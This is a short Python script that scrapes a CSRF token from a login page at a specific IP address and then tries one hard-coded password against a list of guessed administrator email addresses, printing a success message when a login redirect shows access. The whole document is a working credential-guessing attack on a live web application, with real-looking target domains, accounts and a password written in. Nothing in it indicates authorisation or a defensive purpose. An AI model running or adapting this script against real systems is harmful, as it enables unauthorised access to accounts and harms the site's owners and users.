import urllib.request
import urllib.parse
import http.cookiejar
import re

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

login_url = "http://103.90.227.117:8000/login"
resp = opener.open(login_url)
html = resp.read().decode('utf-8')
tokens = re.findall(r'name="_token" value="([^"]+)"', html)
if not tokens:
    print("No CSRF token")
    exit(1)

csrf = tokens[0]

test_emails = [
    'sontayweb.admin@gmail.com',
    'admin@example.com',
    'root@aptiskytich.vn',
    'admin@aptiskytich.vn',
    'contact@aptiskytich.vn',
    'admin@sontayweb.vn'
]

password = "20b38CDUY2LiegWkvdJa"

for email in test_emails:
    data = urllib.parse.urlencode({
        '_token': csrf,
        'email': email,
        'password': password
    }).encode('utf-8')

    req = urllib.request.Request(login_url, data=data, headers={
        'User-Agent': 'Mozilla/5.0',
        'Referer': login_url
    })

    try:
        res = opener.open(req)
        final_url = res.geturl()
        print(f"Email '{email}' -> redirected to: {final_url}")
        if '/login' not in final_url:
            print(f"🎉 LOGGED IN SUCCESSFULLY WITH {email}!")
            break
    except Exception as e:
        print(f"Error testing {email}: {e}")
